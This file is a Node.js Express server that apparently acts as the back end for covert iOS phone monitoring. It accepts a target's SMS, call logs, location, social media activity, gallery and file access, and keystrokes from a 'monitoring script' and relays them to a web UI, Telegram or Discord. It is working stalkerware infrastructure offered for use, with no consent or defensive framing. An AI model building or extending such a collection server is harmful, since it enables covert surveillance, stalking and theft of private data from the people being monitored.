const express = require('express');
const bodyParser = require('body-parser');
const cors = require('cors');
const session = require('express-session');
const app = express();

app.use(cors());
app.use(bodyParser.urlencoded({ extended: true }));
app.use(bodyParser.json());

app.use(session({
    secret: 'your_secret_key', // Replace with a strong secret in production
    resave: false,
    saveUninitialized: true,
    cookie: { secure: false } // Set to true if using HTTPS
}));

// Replace with your actual passkey
const correctPasskey = "your_secure_passkey";

let activityData = {
    Notifications: '',
    SMS: '',
    CallLogs: '',
    Location: '',
    SocialMedia: '',
    GalleryAccess: '',
    FileManager: '',
    Keystrokes: ''
};

// Login endpoint to authenticate the user
app.post('/login', (req, res) => {
    const { passkey } = req.body;
    
    // Check if passkey matches
    if (passkey === correctPasskey) {
        req.session.authenticated = true; // Set session auth flag
        res.status(200).json({ message: "Login successful" });
    } else {
        res.status(401).json({ message: "Incorrect passkey" });
    }
});

// Middleware to check if user is authenticated
function isAuthenticated(req, res, next) {
    if (req.session.authenticated) {
        next();
    } else {
        res.status(401).json({ message: "Unauthorized" });
    }
}

// Endpoint for iOS Monitoring Script to send data
app.post('/monitor', isAuthenticated, (req, res) => {
    const { activityType, data } = req.body;
    if (activityType && activityData[activityType] !== undefined) {
        activityData[activityType] = data;
        res.sendStatus(200);
    } else {
        res.sendStatus(400);
    }
});

// Endpoint for clients (Web UI, Telegram, Discord) to fetch data for a specific activity
app.get('/fetch/:activityType', isAuthenticated, (req, res) => {
    const { activityType } = req.params;
    res.json({ data: activityData[activityType] || "No data available" });
});

// Endpoint to check authentication status
app.get('/auth-status', (req, res) => {
    if (req.session.authenticated) {
        res.status(200).json({ authenticated: true });
    } else {
        res.status(401).json({ authenticated: false });
    }
});

// Logout endpoint
app.post('/logout', (req, res) => {
    req.session.destroy(() => {
        res.status(200).json({ message: "Logged out" });
    });
});

app.listen(3000, () => {
    console.log('Server running on http://localhost:3000');
});
